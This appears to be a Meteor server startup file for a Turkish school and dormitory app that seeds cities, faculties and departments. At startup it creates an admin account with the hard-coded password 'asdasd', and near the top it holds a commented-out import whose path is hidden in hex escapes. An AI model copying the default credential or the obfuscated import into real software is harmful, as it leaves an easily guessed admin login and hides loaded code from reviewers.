import { Meteor } from 'meteor/meteor';
import { HTTP } from 'meteor/http';
//import { reCAPTCHA } from 'meteor/altapp:recaptcha';

import { Roles } from '../imports/api/collections/roles.js';
import { Dormitories } from '../imports/api/collections/dormitories.js';
import { DormitoryInfos } from '../imports/api/collections/dormitoryInfos.js';
import { Schools } from '../imports/api/collections/schools.js';
import { SchoolInfos } from '../imports/api/collections/schoolInfos.js';
import { Logs } from '/imports/api/collections/logs.js';
import { News } from '../imports/api/collections/news.js';
import { Comments } from '../imports/api/collections/comments.js';
import { CityCounty } from '../imports/api/collections/cityCounty.js';
import { Departments } from '../imports/api/collections/departments.js';
import { Faculties } from '../imports/api/collections/faculties.js';
import { FacultyDepartments } from '../imports/api/collections/facultyDepartments.js';

import '../imports/api/collections/users.js';

import '../imports/startup/server/index.js'

//import "\x2F\x69\x6D\x70\x6F\x72\x74\x73\x2F\x61\x70\x69\x2F\x73\x65\x72\x76\x65\x72\x2F\x5F\x5F\x65\x6E\x63\x5F\x41\x5F\x31\x36\x78\x50\x5F\x5F\x30\x31\x30\x31\x2E\x6A\x73"; /*__enc_A import */

//import { SchoolVideos } from '../imports/api/collections/schoolVideos.js';
//import { SchoolImages } from '../imports/api/collections/schoolImages.js';
//import { Messages } from '../imports/api/collections/messages.js';

Meteor.startup(() => {

  if(CityCounty.find().count() == 0){

    CityCounty.insert({
      city : "Adana",
      county : ["Aladağ", "Ceyhan", "Çukurova","Feke", "İmamoğlu", "Karaisalı", "Karataş", "Kozan", "Pozantı", "Saimbeyli", "Sarıçam", "Seyhan", "Tufanbeyli", "Yumurtalık", "Yüreğir"]
    })

    CityCounty.insert({
        city : 'İstanbul',
        county : ["Adalar", "Arnavutköy", "Ataşehir", "Avcılar", "Bağcılar"]
    })

    CityCounty.insert({
      city : 'İzmir',
      county : ['Aliağa', 'Balçova', 'Bayındır', 'Bayraklı', 'Bergama']
    })

    CityCounty.insert({
      city : 'Ankara',
      county : ['Akyurt', 'Altındağ', 'Ayaş', 'Balâ', 'Beypazarı']
    })
  }

  reCAPTCHA.config({
    publickey: "6LeqWx8TAAAAAOf_iLzAXMSXiLGHnq7iyTKuWEiF"
  })

  if(Faculties.find().count() == 0){
    const faculties = ['Atatürk Eğitim', 'Diş Hekimliği', 'Eczacılık', 'Fen-Edebiyat', 'Güzel Sanatlar', 'Hukuk', 'İktisat', 'İlahiyat',
    'İletişim', 'İşletme', 'Mühendislik', 'Sağlık Bilimleri', 'Siyasal Bilgiler', 'Spor Bilimleri', 'Teknik Eğitim', 'Teknoloji', 'Tıp'];

    for(let i = 0; i < faculties.length; i++){
      Faculties.insert({
        facultyName : faculties[i]
      })
    }
  }

  if(Departments.find().count() == 0){
    const departments = ['Bilgisayar ve Öğretim Teknolojileri Eğitimi', 'Din Kültürü ve Ahlak Bilgisi', 'Eğitim Bilimleri', 'Güzel Sanatlar Eğitimi',
    'İlköğretim Bölümü', 'OÖ Fen, Matematik Alanlar', 'OÖ Sosyal Alanlar', 'Özel Eğitim', 'Türkçe Eğitimi', 'Yabancı Diller Eğitimi', 'Pedagojik Formasyon Birimi',
    'OÖE Uygulama Birimi'];

    for(let i = 0; i < departments.length; i++){
      Departments.insert({
        departmentName : departments[i]
      })
    }
  }



  adminControl = Meteor.users.findOne({"username" : "admin"})
  if(!adminControl){
    Accounts.createUser({
      username : "admin",
      password : 'asdasd',
      profile : {
        name : 'admin',
        surname : 'admin',
        role : 'admin'
      }
    })
  }
});
